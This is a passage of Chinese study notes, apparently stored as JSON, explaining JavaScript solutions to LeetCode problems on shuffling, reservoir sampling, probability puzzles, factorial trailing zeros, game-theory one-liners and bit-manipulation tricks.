打乱数组](https://leetcode.cn/problems/shuffle-an-array/)|🟠|\n|[382. Linked List Random Node](https://leetcode.com/problems/linked-list-random-node/)|[382. 链表随机节点](https://leetcode.cn/problems/linked-list-random-node/)|🟠|\n\n\n## 目录\n<!-- toc -->\n ## 第 384 题「[打乱数组](https://leetcode.cn/problems/shuffle-an-array)」 \n\n\n```javascript hl:14\nvar Solution = function (nums) {\n  this.nums = nums;\n  this.copy = [...nums];\n};\n\nSolution.prototype.reset = function () {\n  return this.nums;\n};\n\n// 洗牌算法\nSolution.prototype.shuffle = function () {\n  const n = this.nums.length;\n  for (let i = 0; i < n; i++) {\n    // 生成一个 [i, n-1] 区间内的随机数\n    const r = i + Math.floor(Math.random() * (n - i));\n    // 交换 copy[i] 和 copy[r]\n    [this.copy[i], this.copy[r]] = [this.copy[r], this.copy[i]];\n  }\n  return this.copy;\n};\n```\n\n## 水塘抽样算法（Reservoir Sampling）\n\n水塘抽样算法是一个随机采样算法，它可以从一个**包含未知大小的数据流中**随机选择 k 个样本。这个算法的特点是：\n1. 只需要遍历一次数据\n2. 对内存的使用是恒定的\n3. **保证每个元素被选中的概率相等**\n\n\n### 水塘抽样算法：从数据流中随机选择一个元素（k=1）：\n\n````javascript hl:8\n// 从数据流中随机选择一个元素\nfunction reservoirSample(stream) {\n    let result = null;  // 存储最终选中的元素\n    let count = 0;      // 记录当前处理的元素个数\n    \n    for (const item of stream) {\n        count++;\n        // 以 1/count 的概率选择当前元素\n        if (Math.random() < 1/count) {\n            result = item;\n        }\n    }\n    \n    return result;\n}\n\n// 示例使用\nconst stream = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nconsole.log(reservoirSample(stream));\n````\n\n###  水塘抽样算法：从数据流中随机选择 k 个元素：\n\n````javascript\n// 从数据流中随机选择k个元素\nfunction reservoirSampleK(stream, k) {\n    const reservoir = [];  // 存储最终选中的k个元素\n    let count = 0;        // 记录当前处理的元素个数\n    // 处理前k个元素\n    for (const item of stream) {\n        count++;\n        if (count <= k) {\n            // 前k个元素直接放入水塘中\n            reservoir.push(item);\n        } else {\n            // 对于第k个之后的元素\n            // 以 k/count 的概率选择当前元素替换水塘中的随机一个\n            const j = Math.floor(Math.random() * count);\n            if (j < k) {\n                reservoir[j] = item;\n            }\n        }\n    }\n    \n    return reservoir;\n}\n\n// 示例使用\nconst stream = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\nconst k = 3;\nconsole.log(reservoirSampleK(stream, k));\n````\n\n### 算法原理解释：\n\n1. 对于 k=1 的情况：\n\t- 当处理第 i 个元素时，以 1/i 的概率选择该元素\n\t- 这样保证了每个元素最终被选中的概率都是相等的\n2. 对于选择 k 个元素的情况：\n\t- 前 k 个元素直接放入结果集合中\n\t- 对于第 i 个元素（i > k）：\n\t\t- 以 k/i 的概率决定是否选择当前元素\n\t\t- 如果选择当前元素，则随机替换结果集合中的一个元素\n\n### 数学证明：\n- 对于任意位置的元素，最终被选中的概率都是 k/n（n为总元素个数）\n- 这保证了算法的公平性，每个元素都有相同的概率被选中\n\n### 使用场景：\n\n1. 从大数据流中随机抽样\n2. 在内存受限的情况下需要随机选择元素\n3. 在线算法中需要保持随机样本\n4. 大规模日志分析中的采样\n\n### 注意事项：\n\n1. 算法的空间复杂度是 O(k)\n2. 时间复杂度是 O(n)，其中 n 是数据流的长度\n3. 算法只需要遍历一次数据\n4. 生成的随机数要足够随机，以保证采样的公平性\n\n这个算法在处理大规模数据流时特别有用，因为它不需要预先知道数据的总量，而且内存使用是固定的。\n\n\n## 第 382 题「[链表随机节点](https://leetcode.cn/problems/linked-list-random-node)」\n\n```javascript\n/**\n * @param {ListNode} head\n */\nvar Solution = function (head) {\n  this.head = head;\n  this.r = Math.random;\n};\n\n/**\n * @return {number}\n */\nSolution.prototype.getRandom = function () {\n  let i = 0,\n    res = 0;\n  let p = this.head;\n  // while 循环遍历链表\n  while (p !== null) {\n    i++;\n    // 生成一个 [0, i) 之间的整数\n    // 这个整数等于 0 的概率就是 1/i\n    if (Math.floor(this.r() * i) === 0) {\n      res = p.val;\n    }\n    p = p.next;\n  }\n  return res;\n};\n```\n\n## [398. 随机数索引](https://leetcode.cn/problems/random-pick-index/)\n\n![图片&文件](./files/20241120-3.png)\n\n```javascript hl:10,14\nvar Solution = function (nums) {\n  this.nums = nums;\n  this.rand = Math.random;\n};\n\nSolution.prototype.pick = function (target) {\n  let count = 0,\n    res = -1;\n  for (let i = 0; i < this.nums.length; i++) {\n    if (this.nums[i] !== target) {\n      continue;\n    }\n    count++;\n    if (Math.floor(this.rand() * count) === 0) {\n      res = i;\n    }\n  }\n  return res;\n};\n```","ZUF3X9xf":"\n# 如何同时寻找缺失和重复的元素\n\n`#数学运算`\n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[645. Set Mismatch](https://leetcode.com/problems/set-mismatch/)|[645. 错误的集合](https://leetcode.cn/problems/set-mismatch/)|🟢|\n\n\n\n## 目录\n<!-- toc -->\n ## 第 645 题「[错误的集合](https://leetcode.cn/problems/set-mismatch)」 \n\n![图片&文件](./files/20241120-8.png)\n\n给一个长度为 `N` 的数组 `nums`，其中本来装着 `[1..N]` 这 `N` 个元素，无序。但是现在出现了一些错误，`nums` 中的一个元素出现了重复，也就同时导致了另一个元素的缺失。请你写一个算法，找到 `nums` 中的**重复元素和缺失元素的值**\n\n比如说输入：`nums = [0,1,2,4,4]`，算法返回 `[4,3]`。\n\n## 思路一：hash\n\n先遍历一次数组，用一个哈希表记录每个数字出现的次数，然后遍历一次 `[1..N]`，看看那个元素重复出现，那个元素没有出现\n\n\n## 思路二：通过将每个索引对应的元素变成负数，以表示这个索引被对应过一次了\n\n### 分析\n\n- 如果说 `nums` 中不存在重复元素和缺失元素，那么每个元素就和唯一一个索引值对应，\n- 现在的问题是，有一个元素重复了，同时导致一个元素缺失了，这会产生什么现象呢？\n\t- 会导致有两个元素对应到了同一个索引\n\t- 而且会有一个索引没有元素对应过去\n\n\n```bash\n输入：nums = [1,2,2,4]\n过程：\n1. 第一次遍历：\n   - 遇到 1：将 index=0 (1-1) 处变为负数 → [-1,2,2,4]\n   - 遇到 2：将 index=1 (2-1) 处变为负数 → [-1,-2,2,4]\n   - 遇到 2：发现 index=1 (2-1) 处已经是负数，说明 2 是重复数字\n   - 遇到 4：将 index=3 (4-1)  处变为负数 → [-1,-2,2,-4]\n\n2. 第二次遍历：\n   - 发现 index=2 处是正数\n   - 说明数字 3 (index+1) 是丢失的数字\n\n输出：[2,3]  // 重复的是 2，丢失的是 3\n\n```\n\n### 代码\n\n```javascript\nvar findErrorNums = function (nums) {\n  let n = nums.length;\n  // 用于存储重复的数字\n  let dup = -1;\n\n  // 第一次遍历 - 找重复数：\n  for (let i = 0; i < n; i++) {\n    // 获取当前数字对应的索引，比如 -2 对应的索引应该为 3\n    let index = Math.abs(nums[i]) - 1;\n    // 如果该位置已经是负数，说明遇到重复数字\n    if (nums[index] < 0) {\n      dup = Math.abs(nums[i]);\n      // 如果是正数，将访问过的位置标记为负数\n    } else {\n      nums[index] *= -1;\n    }\n  }\n  // 用于存储丢失的数字\n  let missing = -1;\n  // 遍历完成后，唯一保持正数的位置对应的就是丢失的数字\n  for (let i = 0; i < n; i++) {\n    // 如果某个位置的数字是正数，说明这个位置没被访问过\n    if (nums[i] > 0) {\n      // 将索引转换成元素,该位置对应的数字就是丢失的数字\n      missing = i + 1;\n    }\n  }\n  return [dup, missing];\n};\n```\n\n## 总结\n\n\n对于这种数组问题，**关键点在于元素和索引是成对儿出现的，常用的方法是排序、异或、映射**。\n\n- 映射的思路就是我们刚才的分析，**将每个索引和元素映射起来**，通过**正负号记录**某个元素是否被映射。\n- 排序的方法也很好理解，对于这个问题，可以想象如果元素都被从小到大排序，如果发现索引对应的元素如果不相符，就可以找到重复和缺失的元素。\n- 异或运算也是常用的，因为异或性质 `a ^ a = 0, a ^ 0 = a`，如果将索引和元素同时异或，就可以消除成对儿的索引和元素，留下的就是重复或者缺失的元素\n\n","Detd2Q2t":"\n# 反直觉的概率问题\n\n`#数学运算` \n\n\n## 目录\n<!-- toc -->\n ## 概率原则 \n\n- 请搞清楚**样本空间是什么**？\n\n## 男孩女孩问题\n\n假设有一个家庭，有两个孩子，现在告诉你其中有一个男孩，请问另一个也是男孩的概率是多少？\n\n- `1/2`  ？ \n\t- 因为另一个孩子要么是男孩，要么是女孩，而且概率相等呀\n\t- 但是**实际上，答案是 1/3**。\n\n- 有两个孩子，那么**样本空间**为 4\n\t- 即哥哥妹妹，哥哥弟弟，姐姐妹妹，姐姐弟弟这四种情况\n\t- 已知有一个男孩，那么排除姐姐妹妹这种情况，所以样本空间变成 3\n\t\t- 另一个孩子也是男孩只有哥哥弟弟这 1 种情况，所以概率为 1/3。\n\n## 生日悖论\n\n一个屋子里需要有多少人，才能使得存在至少两个人生日是同一天的概率达到 50% ？ \n- 按照直觉，要得到 50% 的概率，起码得有 183 个人吧，因为一年有 365 天呀\n\n```javascript\nfunction birthdayProbability(n) {\n  // 如果人数超过365，概率必然为1\n  if (n > 365) {\n    return 1.0;\n  }\n\n  // 计算所有人生日都不同的概率\n  // 使用乘积计算所有人生日都不同的概率\n  let probDifferent = 1.0;\n  for (let i = 0; i < n; i++) {\n    probDifferent *= (365 - i) / 365;\n  }\n\n  // 返回至少两个人生日相同的概率（1减去所有人生日都不同的概率）\n  // 返回至少有两个人生日相同的概率\n  return 1 - probDifferent;\n}\n\n// 找到使概率超过50%的最小人数\nlet n = 1;\nwhile (birthdayProbability(n) < 0.5) {\n  n++;\n}\n\nconsole.log(`需要${n}人，才能使得至少两个人生日相同的概率超过50%`);\n\n// 展示不同人数下的概率\nconsole.log(\"\\n不同人数下的概率：\");\nfor (let i = n - 2; i <= n + 2; i++) {\n  const prob = birthdayProbability(i);\n  console.log(`${i}人时的概率: ${(prob * 100).toFixed(2)}%`);\n}\n\n```\n\n```javascript\n需要23人，才能使得至少两个人生日相同的概率超过50%\n\n不同人数下的概率：\n21人时的概率: 44.37%\n22人时的概率: 47.57%\n23人时的概率: 50.73%\n24人时的概率: 53.83%\n25人时的概率: 56.87%\n\n```\n\n当人数达到 `70` 时，存在两个人生日相同的概率就上升到了 99.9%，基本可以认为是 100% 了。所以从概率上说，一个几十人的小团体中存在生日相同的人真没啥稀奇的。\n\n> 在组合事件中，即使单个事件的概率很小，但当样本量增加时，某些事件发生的概率会快速增长，并不是线性的\n\n## 三门问题\n\n游戏参与者面对三扇门，其中两扇门后面是山羊，一扇门后面是跑车\n\n- 你是游戏参与者，现在有门 1,2,3，假设你随机选择了门 1，然后主持人打开了门 3 告诉你那后面是山羊。\n- 现在，你是坚持你最初的选择门 1，还是选择换成门 2 呢\n\t- 换还是不换？\n\n![图片&文件](./files/20241120-9.png)\n\n主持人开门实际上**在「浓缩」概率**。\n- 一开始你选择到跑车的概率当然是 1/3，剩下两个门中包含跑车的概率当然是 2/3，这没啥可说的。\n- 但是主持人帮你排除了一个含有山羊的门，相当于把那 2/3 的概率浓缩到了剩下的这一扇门上。\n- 那么，你说你**是抱着原来那扇 1/3 的门**，还是换成那扇经过「浓缩」的 2/3 概率的门呢\n\n假设三扇门分别标记为 A、B、C，我们来列举所有可能的情况：\n\n### 假设汽车在 A 门后面\n初始选择 | 主持人可打开的门 | 剩余可换的门 | 换门结果 | 不换结果\n---------|-----------------|-------------|----------|----------\n选A | B或C (主持人选一个) | C或B | 输 | 赢\n选B | C | A | 赢 | 输\n选C | B | A | 赢 | 输\n\n### 假设汽车在 B 门后面\n| 初始选择 | 主持人可打开的门     | 剩余可换的门 | 换门结果 | 不换结果 |\n| ---- | ------------ | ------ | ---- | ---- |\n| 选A   | C            | B      | 赢    | 输    |\n| 选B   | A或C (主持人选一个) | C或A    | 输    | 赢    |\n| 选C   | A            | B      | 赢    | 输    |\n\n### 假设汽车在 C 门后面\n初始选择 | 主持人可打开的门 | 剩余可换的门 | 换门结果 | 不换结果\n---------|-----------------|-------------|----------|----------\n选A | B | C | 赢 | 输\n选B | A | C | 赢 | 输\n选C | A或B (主持人选一个) | B或A | 输 | 赢\n\n### 总结统计\n\n1. **总共有12种基本情况**（考虑主持人的选择）\n2. **如果选择换门**：\n   - 赢的情况：6种（当初始选择是羊时）\n   - 输的情况：3种（当初始选择是车时）\n   - 获胜概率：6/9 = 2/3 ≈ 66.7%\n3. **如果选择不换**：\n   - 赢的情况：3种（当初始选择是车时）\n   - 输的情况：6种（当初始选择是羊时）\n   - 获胜概率：3/9 = 1/3 ≈ 33.3%\n\n### 关键点说明\n\n1. 初始选择时，选中汽车的概率是 1/3，选中羊的概率是 2/3\n2. 主持人的行为不是随机的，他知道车在哪里，并且一定会打开一扇有羊的门\n3. 当你最初选中羊时（概率 2/3），换门必赢\n4. 当你最初选中车时（概率 1/3），换门必输\n\n","vHqoJIrm":"\n# 阶乘算法题\n\n\n| LeetCode                                                                                                                     | 力扣                                                                                          | 难度  |\n| ---------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- | --- |\n| [793. Preimage Size of Factorial Zeroes Function](https://leetcode.com/problems/preimage-size-of-factorial-zeroes-function/) | [793. 阶乘函数后 K 个零](https://leetcode.cn/problems/preimage-size-of-factorial-zeroes-function/) | 🔴  |\n| [172. Factorial Trailing Zeroes](https://leetcode.com/problems/factorial-trailing-zeroes/)                                   | [172. 阶乘后的零](https://leetcode.cn/problems/factorial-trailing-zeroes/)                       | 🟠  |\n\n\n## 目录\n<!-- toc -->\n ## 1. 第 793 题：阶乘后的零 \n\n- 输入一个非负整数 `n`，请你计算阶乘 `n!` 的结果末尾有`几个 0` ？\n\t- 比如说输入 `n = 5`，算法返回 1，因为 `5! = 120`，末尾有一个 0。\n\n### 1.1. 思路\n\n- 肯定不可能真去把 `n!` 的结果算出来，**阶乘增长可是比指数增长都恐怖**\n- 首先，两个数相乘结果末尾有 `0`，一定是因为两个数中有因子 `2` 和 `5`，因为 `10 = 2 x 5`\n\t- **只要是偶数就能分解除因子 `2`，所以，只需要关注能够分解除多少因子 `5`**\n\t\t- 举个例子：`5! = 1*2*3*4*5` \n\t\t\t- 只有一个 5 ，但有两个偶数 2 和 4\n- 所以问题转换为：==`n!` 最多可以分解出多少个因子 5==\n\n- 首先计算n 中 5的倍数的个数：n/5\n- 然后计算n中25的倍数的个数：n/25（因为25贡献了两个5）\n- 然后计算n中125的倍数的个数：n/125（因为125贡献了三个5）\n- 以此类推...\n- 比如计算 25! 末尾有多少个0：\n\t- 5的倍数：25÷5 = 5个数（5,10,15,20,25）\n\t- 25的倍数：25÷25 = 1个数（25）\n\t- 最终结果：6个0\n- 所以 25! 末尾有6个0，实际上25! = 15511210043330985984000000，确实末尾有6个0。\n\n### 1.2. 代码\n\n```javascript\nvar trailingZeroes = function (n) {\n  // 用于存储结果（零的个数）\n  let res = 0;\n  // 除数，初始值为5\n  let divisor = 5;\n\n  // 从 5 开始，每次乘 5\n  // 并 统计 n 中有多少个 5 的因子\n  while (divisor <= n) {\n    // n 除以 5 的商，即 n 中包含有多少个 5 的因子\n    // n 除以 25 的商，即 n 中包含有多少个 25 的因子\n    // n 除以 125 的商，即 n 中包含有多少个 125 的因子\n    // ...\n    res += Math.floor(n / divisor);\n    divisor = divisor * 5;\n  }\n  return res;\n};\n```\n\n## 2. 第 793 题：阶乘函数后 K 个零\n\n- 输入一个非负整数 `K`，请你计算有多少个 `n`，满足 `n!` 的结果末尾恰好有 `K` 个 0。\n\t- 比如说输入 `K = 1`，算法返回 5，因为 `5!,6!,7!,8!,9!` 这 5 个阶乘的结果最后只有一个 0，即有 5 个 `n` 满足条件。\n\n### 2.1. 思路\n\n可以使用**二分查找**来解决，因为 **n! 末尾零的个数是单调递增的**\n\n### 2.2. 代码\n\n```javascript\n// 可以使用**二分查找**来解决，因为 **n! 末尾零的个数是单调递增的**\nvar preimageSizeFZF = function (K) {\n  // 左边界和右边界之差 + 1 就是答案\n  return right_bound(K) - left_bound(K) + 1;\n};\n\n// 搜索 trailingZeroes(n) == K 的左侧边界\nvar left_bound = function (target) {\n  var lo = 0,\n    hi = 10 ** 10;\n  while (lo < hi) {\n    var mid = lo + Math.floor((hi - lo) / 2);\n    if (trailingZeroes(mid) < target) {\n      lo = mid + 1;\n    } else if (trailingZeroes(mid) > target) {\n      hi = mid;\n    } else {\n      hi = mid;\n    }\n  }\n  return lo;\n};\n\n// 搜索 trailingZeroes(n) == K 的右侧边界\nvar right_bound = function (target) {\n  var lo = 0,\n    hi = 10 ** 10;\n  while (lo < hi) {\n    var mid = lo + Math.floor((hi - lo) / 2);\n    if (trailingZeroes(mid) < target) {\n      lo = mid + 1;\n    } else if (trailingZeroes(mid) > target) {\n      hi = mid;\n    } else {\n      lo = mid + 1;\n    }\n  }\n  return lo - 1;\n};\n\nvar trailingZeroes = function (n) {\n  // 用于存储结果（零的个数）\n  let res = 0;\n  // 除数，初始值为5\n  let divisor = 5;\n\n  // 从 5 开始，每次乘 5\n  // 并 统计 n 中有多少个 5 的因子\n  while (divisor <= n) {\n    // n 除以 5 的商，即 n 中包含有多少个 5 的因子\n    // n 除以 25 的商，即 n 中包含有多少个 25 的因子\n    // n 除以 125 的商，即 n 中包含有多少个 125 的因子\n    // ...\n    res += Math.floor(n / divisor);\n    divisor = divisor * 5;\n  }\n  return res;\n};\n\n```\n\n","pzNZ7le8":"\n# 判断一个数是否是素数\n\n`#数学运算`\n\n\n## 目录\n<!-- toc -->\n ## 思路1 \n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/d7bf6e3d5cb1498ea2adc78b638d0332.png)\n\n### 另外一个思路\n\n- 首先从 2 开始，我们知道 2 是一个素数，那么 `2 × 2 = 4, 3 × 2 = 6, 4 × 2 = 8… `都不可能是素数了。\n- 然后我们发现 3 也是素数，那么 `3 × 2 = 6, 3 × 3 = 9, 3 × 4 = 12… `也都不可能是素数了。\n\n所以，找一个输在`primes=[] 、primes.flll(true) ` ，填充`prime` ，最后返回为`true`的个数\n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/51f8b821cec36334861176bf701e8743.png)","xIirOX6q":"\n# 一行代码就能解决的算法题\n\n| LeetCode                                                           | 力扣                                                       | 难度  |\n| ------------------------------------------------------------------ | -------------------------------------------------------- | --- |\n| [319. Bulb Switcher](https://leetcode.com/problems/bulb-switcher/) | [319. 灯泡开关](https://leetcode.cn/problems/bulb-switcher/) | 🟠  |\n| [877. Stone Game](https://leetcode.com/problems/stone-game/)       | [877. 石子游戏](https://leetcode.cn/problems/stone-game/)    | 🟠  |\n| [292. Nim Game](https://leetcode.com/problems/nim-game/)           | [292. Nim 游戏](https://leetcode.cn/problems/nim-game/)    | 🟢  |\n\n\n## 目录\n<!-- toc -->\n ## 第 292 题「[Nim 游戏](https://leetcode.cn/problems/nim-game)」 \n\n### 题目\n\n你和你的朋友面前有一堆石子，你们轮流拿，一次至少拿一颗，最多拿三颗，谁拿走最后一颗石子谁获胜\n\n假设你们都很聪明，**由你第一个开始拿**，请你写一个算法，输入一个正整数 `n`，返回你是否能赢（true 或 false）。\n\n### 反着思考\n\n- 如果我能赢，那么最后轮到我取石子的时候**必须要剩下 1~3 颗石子**，这样我才能一把拿完\n\t- 显然，如果对手拿的时候**只剩 4 颗石子**，那么无论他怎么拿，总会剩下 1~3 颗石子，我就能赢。\n\t\t- 如何逼迫对手面对 4 颗石子呢？\n\t\t\t- 让我选择的时候还有 5~7 颗石子，这样的话我就有把握让对方不得不面对 4 颗石子。\n\t\t\t\t- 如何营造 5~7 颗石子的局面呢？让对手面对 8 颗石子，无论他怎么拿，都会给我剩下 5~7 颗，我就能赢。\n\t\t\t\t\t- 这样一直循环下去，我们发现**只要踩到 4 的倍数，就落入了圈套**，永远逃不出 4 的倍数，而且一定会输\n\n### 代码\n\n```javascript\nvar canWinNim = function(n) {\n    // 如果上来就踩到 4 的倍数，那就认输吧\n    // 否则，可以把对方控制在 4 的倍数，必胜\n    return n % 4 !== 0;\n}\n```\n\n## 第 877 题「[石子游戏](https://leetcode.cn/problems/stone-game)」\n\n### 题目\n\n你和你的朋友面前有**一排石头堆**\n- 用一个数组 `piles` 表示，`piles[i]` 表示第 `i` 堆石子有多少个\n- 你们轮流拿石头，一次拿一堆，但是只能拿走最左边或者最右边的石头堆。\n- 所有石头被拿完后，谁拥有的石头多，谁获胜。\n- 一是石头总共有**偶数堆**，石子的 **总数** 是 **奇数** ，所以没有平局\n\n**假设你们都很聪明**，由**你第一个开始拿**，请你写一个算法，输入一个数组 `piles`，返回你是否能赢（true 或 false）。\n\n举个例子，`piles=[2, 1, 9, 5]`\n- 你先拿，可以拿 2 或者 5，你选择 2。\n- `piles=[1, 9, 5]`，轮到对手，可以拿 1 或 5，他选择 5。\n- `piles=[1, 9]` 轮到你拿，你拿 9。\n- 最后，你的对手只能拿 1 了。\n- 这样下来，你总共拥有 `2 + 9 = 11` 颗石头，对手有 `5 + 1 = 6` 颗石头，你是可以赢的，所以算法应该返回 true。\n\n>  结论：==只要你足够聪明，你是必胜无疑的，因为你是先手。==\n\n```javascript\nvar stoneGame = function(piles) {\n    return true;\n}\n```\n\n## 第 319 题「[灯泡开关](https://leetcode.cn/problems/bulb-switcher)」\n\n有 `n` 盏电灯，最开始时都是关着的。现在要进行 `n` 轮操作：\n- 第 1 轮操作是把**每一盏**电灯的开关按一下（全部打开）。\n- 第 2 轮操作是把**每两盏**灯的开关按一下（就是按第 2，4，6... 盏灯的开关，它们被关闭）。\n- 第 3 轮操作是把**每三盏**灯的开关按一下（就是按第 3，6，9... 盏灯的开关，有的被关闭，比如 3，有的被打开，比如 6）\n- ...\n- 如此往复，直到第 `n` 轮，即只按一下第 `n` 盏灯的开关。\n\n现在给你输入一个正整数 `n` 代表电灯的个数，问你经过 `n` 轮操作后，这些电灯有多少盏是亮的？\n\n### 思考\n\n首先，因为电灯一开始都是关闭的，所以某一盏灯最后如果是点亮的，必然要**被按奇数次**开关。\n- 我们假设只有 6 盏灯，而且我们**只看第 6 盏灯**。\n\t- 需要进行 **6 轮操作**对吧，请问对于第 6 盏灯，会被按下几次开关呢？\n\t\t- 这不难得出，第 1 轮会被按，第 2 轮，第 3 轮，第 6 轮都会被按。\n\t\t\t- 为什么第 1、2、3、6 轮会被按呢？因为 `6=1*6=2*3`。\n\t\t\t\t- 一般情况下，因子都是成对出现的，也就是说开关被按的次数一般是偶数次。\n\t\t\t\t- 但是有特殊情况，比如说总共有 16 盏灯，那么第 16 盏灯会被按几次?\n\t\t\t\t\t- `16 = 1*16 = 2*8 = 4*4`其中因子 4 重复出现，所以第 16 盏灯会被按 5 次，奇数次。\n\t\t\t\t\t\t- 就假设现在总共有 16 盏灯，我们求 16 的平方根，等于 4，这就说明最后会有 4 盏灯亮着，它们分别是第 `1*1=1` 盏、第 `2*2=4` 盏、第 `3*3=9` 盏和第 `4*4=16` 盏。\n\n### 代码\n\n```javascript\nvar bulbSwitch = function(n) {\n    return Math.floor(Math.sqrt(n));\n};\n```","D8WKdK9R":"\n# 位运算技巧\n\n\n\n\n## 目录\n<!-- toc -->\n ## `定义：`六种常见的`位运算`（来自GPT） \n\n位运算是对整数在二进制形式下的每一位(bit)进行的运算。这些运算通常比标准的算术或逻辑运算要快，因为`它们直接在CPU中进行。`以下是几种常见的位运算类型及其说明：\n\n-  **按位与（AND）**： \n\t- 符号：`&`\n\t- 规则：两个位都为1时，结果为1；否则为0。\n\t- 例子：`1010 & 1100 = 1000`\n-  **按位或（OR）**： \n\t- 符号：`|`\n\t- 规则：两个位中只要有一个为1，结果就为1；如果都不为1，结果就为0。\n\t- 例子：`1010 | 1100 = 1110`\n-  **按位异或（XOR）**： 可理解为`相减的绝对值`\n\t- 符号：`^`\n\t- 规则：两个位不相同时，结果为1；相同时为0。\n\t- 例子：`1010 ^ 1100 = 0110`\n-  **按位取反（NOT）**： \n\t- 符号：`~`\n\t- 规则：将位中的0变成1，1变成0。\n\t- 例子：`~1010 = 0101`（假设是4位二进制数）\n-  **左移（Left Shift）**： \n\t- 符号：`<<`\n\t- 规则：将二进制全部位向左移动指定的位数，右边空出的位用0填充。\n\t- 例子：`1010 << 2 = 101000`\n-  **右移（Right Shift）**： \n\t- 符号：`>>`\n\t- 规则：有两种右移，逻辑右移和算术右移。逻辑右移将二进制全部位向右移动指定的位数，左边空出的位用0填充；算术右移在许多系统中会保留符号位（即最左边的位），所以如果是正数左边填充0，负数左边填充1。\n\t- 例子（逻辑右移）：`1010 >> 2 = 0010`\n\t- 例子（算术右移）：如果是负数，例如 `-1010 >> 2` 在32位系统中可能会得到 `11111111111111111111111111111010`\n\n这些位运算`在低级编程、硬件设计、加密算法等领域中非常有用`，因为它们可以高效地直接操作数据的二进制表示。\n\n\n## 几个有趣的位操作\n\n### 转成大写，转成小写或者大小写互换\n\n记忆技巧：\n\n- 大写：AND，转大写，条件严格些\n- 小写：OR，转小写，条件宽松些\n- 异或：XOR，大小写 VR 换\n\n```javascript\n\n利用或操作 | 和空格将英文字符转换为小写\n\n('a' | ' ') = 'a'\n('A' | ' ') = 'a'\n\n利用与操作 & 和下划线将英文字符转换为大写\n\n('b' & '_') = 'B'\n('B' & '_') = 'B'\n\n利用异或操作 ^ 和空格进行英文字符大小写互换\n\n('d' ^ ' ') = 'D'\n('D' ^ ' ') = 'd'\n\n\n```\n\n> 大小写转化比如`('b' & '_') = 'B'` 或其他的，本质是因为`ASCII` 字符其实就是数字，做运算刚好转了，具体的不用记住\n\n### 不用`临时变量`就能交换两个值，使用`位运算`\n\n![image.png|396](https://832-1310531898.cos.ap-beijing.myqcloud.com/5a3a7b6195ec5f53854446aa0c3352ea.png)\n\n### 判断**两个数是否异号**，用`^` 来判断是否大于 0 \n\n![image.png|282](https://832-1310531898.cos.ap-beijing.myqcloud.com/b5ac53221860c37c0c5b3c71f1663ac6.png)\n\n- 原理：\n\t- 利用的是`补码编码的符号位`。整数编码最高位是符号位，`负数的符号位是 1，非负数的符号位是 0`，\n\t- 再借助异或的特性，可以判断出两个数字是否异号\n- **其他方法**\n   - `乘积`来判断两个数是否异号，但是这种处理方式容易造成`整型溢出`从而出现错误。\n   - `逻辑运算`： `a>0 & b<0 || a<0 & b>0`\n\n### 使用`～` 来 `加一` 或者`减一`\n\n```javascript\n加一\nint n = 1;\nn = -~n;\n// 现在 n = 2\n\n减一\nint n = 2;\nn = ~-n;\n// 现在 n = 1\n```\n\n## 环形数组：`index & (arr.length - 1)`  的运用\n\n如何实现`让数组看起来头尾相接形成一个环形` ？\n\n```javascript\n1,2,3,4 , 1,2,3,4, 1,2,3,4...\n```\n\n### 方法一：使用 `%` 求模\n\n```javascript\nvar arr = [1, 2, 3, 4];\nvar index = 0;\nwhile (true) {\n    // 在环形数组中转圈\n    console.log(arr[index % arr.length]);\n    index++;\n}\n// 输出：1,2,3,4,1,2,3,4,1,2,3,4...\n```\n\n### 方法二：使用 `index & (arr.length - 1)`\n\n```javascript\nvar arr = [1,2,3,4];\nvar index = 0;\nwhile (true) {\n    // 在环形数组中转圈\n    console.log(arr[index & (arr.length - 1)]);\n    index++;\n}\n// 输出：1,2,3,4,1,2,3,4,1,2,3,4...\n```\n\n### 两点说明\n\n> 注意这个技巧只适用于`数组长度是 2 的幂次方`的情况，\n\n> 简单说，`& (arr.length - 1) `这个位运算能够替代 `% arr.length 的模运算`，性能会更好一些。\n\n## 利用 n & (n-1) 的应用\n\n`n & (n-1) `这个操作是算法中常见的，作用是 `消除 n 数字的二进制表示` 中的最后一个 `1` ，见下图：\n\n![image.png|504](https://832-1310531898.cos.ap-beijing.myqcloud.com/9e3ec3f2938022fe5b554440d3219676.png)\n\n### 第 191 题「[位 1 的个数](https://leetcode.cn/problems/number-of-1-bits)」：计算汉明权重（Hamming Weight）\n\n![image.png|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/352470d4bb4ef69b30dcceb86e93b758.png)\n\n```javascript\n// 用一个循环不停地消除 1 同时计数，直到 n 变成 0 为止\nvar hammingWeight = function(n) {\n    var res = 0;\n    while (n != 0) { \n        n = n & (n - 1); \n        res++;\n    }\n    return res;\n};\n```\n\n### 第 231 题「[2 的幂](https://leetcode.cn/problems/power-of-two)」：判断一个数是不是 `2 的指数`\n\n一个数如果是 `2 的指数`，那么它的二进制表示一定`只含有一个 1`\n\n```java\n2^0 = 1 = 0b0001\n2^1 = 2 = 0b0010\n2^2 = 4 = 0b0100\n```\n\n```javascript\n一个数如果是 `2 的指数`，那么它的二进制表示一定`只含有一个 1`\nvar isPowerOfTwo = function(n) {\n    if (n <= 0) return false; // 注意是小于等于\n    return (n & (n - 1)) === 0; // 注意运算符优先级，括号不可以省略\n};\n```\n\n## `a ^ a = 0 ; a ^ 0 = a` 的运用\n\n`异或运算`的性质是需要我们牢记的：\n\n- 一个数和它本身做`异或`运算结果为 `0`，即` a ^ a = 0`；\n- 一个数和 0 做`异或`运算的结果为它`本身`，即 `a ^ 0 = a`\n\n### 第 136 题「[只出现一次的数字](https://leetcode.cn/problems/single-number)」：查找只出现一次的元素\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/90bcb8d27786de417a6b258383b69831.png)\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {number}\n */\nvar singleNumber = function(nums) {\n    let res = 0;\n    nums.forEach((num)=>{\n        console.log(res,num);\n        res = res ^ num; \n    \n    })\n    return res;\n};\n\n\nsingleNumber([4,1,2,2,1,4,5])\n0 4\n4 1\n5 2\n7 2\n5 1\n4 4\n0 5\n```\n\n### 第 268 